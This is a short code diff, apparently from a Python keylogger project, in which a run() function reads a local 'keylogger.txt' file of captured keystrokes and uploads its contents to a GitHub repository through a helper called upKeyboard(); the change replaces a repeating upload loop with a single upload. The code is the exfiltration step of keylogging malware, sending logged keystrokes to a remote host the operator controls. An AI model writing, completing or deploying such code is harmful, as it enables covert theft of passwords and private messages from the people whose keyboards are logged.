@@ -45,12 +45,11 @@ def run(m):
     pythoncom.CoInitialize()
     repo=connect_to_github()
     fileHandel = None
-    while True :
-        print "write"
-        time.sleep(2)
-        fileHandle=open ("C:/pyworks/before/keylogger.txt", 'r' )
-        msg = fileHandle.read()
-        upKeyboard(repo,msg,m)
-        fileHandle.close()
+    
+    print "write"
+    fileHandle=open ("C:/pyworks/before/keylogger.txt", 'r' )
+    msg = fileHandle.read()
+    upKeyboard(repo,msg,m)
+    fileHandle.close()
 
 
